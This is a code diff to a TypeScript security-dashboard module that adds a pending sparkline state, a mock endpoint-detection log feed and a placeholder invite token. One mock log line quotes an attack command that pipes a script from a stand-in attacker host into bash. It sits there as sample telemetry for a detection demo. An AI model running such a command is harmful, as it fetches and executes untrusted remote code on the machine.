@@ -43,8 +43,26 @@ export function observedPod(phase: Phase): Pod | null {
 export function podSpark(phase: Phase): { points: string; color: string } {
   if (phase === 'attacked' || phase === 'isolated')
     return { points: '0,16 20,15 40,14 60,15 80,4 100,3 120,2', color: '#ef4444' }
+  if (phase === 'connected') // CR-1 B-1: not yet attested → flat/grey pending
+    return { points: '0,11 20,11 40,11 60,11 80,11 100,11 120,11', color: '#64748b' }
   return { points: '0,14 20,13 40,15 60,12 80,13 100,11 120,12', color: '#22c55e' }
 }
+
+// CR-1 B-3: NOT-OK log feed (eBPF/FIM/syslog) — visible without opening the drawer
+export function recentLogs(phase: Phase): { t: string; lvl: string; msg: string }[] {
+  if (phase !== 'attacked' && phase !== 'isolated')
+    return [{ t: '14:40:02', lvl: 'ok', msg: 'eBPF execve: /usr/bin/node server.js' },
+            { t: '14:39:51', lvl: 'ok', msg: 'TelemetryReported cpu=12% ram=38%' }]
+  return [
+    { t: '14:41:05', lvl: 'crit', msg: 'edr_registry::IncidentReport CRITICAL → KILLED_AND_ISOLATED' },
+    { t: '14:41:04', lvl: 'crit', msg: 'talus::ClassificationReported anomaly=0.91 → TRIGGER_ISOLATION' },
+    { t: '14:41:03', lvl: 'crit', msg: 'eBPF execve: curl -s http://evil.com/sh | bash' },
+    { t: '14:41:03', lvl: 'warn', msg: 'FIM: /etc/shadow modified (LAST_COMMAND=passwd)' },
+  ]
+}
+
+// CR-1 A-7 / P5: invite token looks real (base58-ish); still a mock until the invite contract ships
+export const inviteToken = 'inv_8Qm4Zr2Tn9Kx7Wb3Yc6Hf1Ld'
 
 export function timeline(phase: Phase): TimelineEvent[] {
   const evs: TimelineEvent[] = []
